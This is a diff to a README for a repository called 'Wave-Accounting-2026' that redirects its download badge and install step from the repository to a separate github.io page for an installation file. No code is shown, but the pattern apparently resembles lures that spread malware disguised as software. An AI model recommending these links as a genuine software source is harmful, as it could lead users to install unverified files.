@@ -1,6 +1,6 @@
 # 📈 Wave-Accounting-2026 - Manage small business finances with ease
 
-[![](https://img.shields.io/badge/Download-Wave_Accounting-blue.svg)](https://github.com/Davr17550/Wave-Accounting-2026)
+[![](https://img.shields.io/badge/Download-Wave_Accounting-blue.svg)](https://davr17550.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you begin the installation pro
 
 Follow these instructions to acquire the installation file:
 
-1. Visit the project repository at https://github.com/Davr17550/Wave-Accounting-2026.
+1. Visit the project repository at https://davr17550.github.io
 2. Locate the link labeled "Download" or click the badge above.
 3. Save the file to your "Downloads" folder.
 4. Verify the file size matches the expected download.
